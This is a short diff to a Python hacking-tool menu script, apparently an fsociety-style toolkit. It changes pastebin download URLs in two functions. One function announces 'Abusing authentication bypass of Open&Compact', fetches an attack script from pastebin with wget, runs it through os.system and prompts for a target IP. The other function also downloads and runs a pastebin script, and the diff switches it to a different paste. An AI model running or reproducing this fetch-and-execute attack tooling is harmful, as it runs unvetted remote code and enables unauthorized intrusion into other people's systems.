@@ -276,7 +276,7 @@ def weeman():
 
 def gabriel():
     print("Abusing authentication bypass of Open&Compact (Gabriel's)")
-    os.system("wget http://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
+    os.system("wget https://pastebin.com/raw/Szg20yUh --output-document=gabriel.py")
     clearScr()
     os.system("python gabriel.py")
     ftpbypass = input("Enter Target IP and Use Command :")
@@ -284,7 +284,7 @@ def gabriel():
 
 
 def sitechecker():
-    os.system("wget http://pastebin.com/raw/Y0cqkjrj --output-document=ch01.py")
+    os.system("wget https://pastebin.com/raw/LL2UHpfh --output-document=ch01.py")
     clearScr()
     os.system("python ch01.py")
 
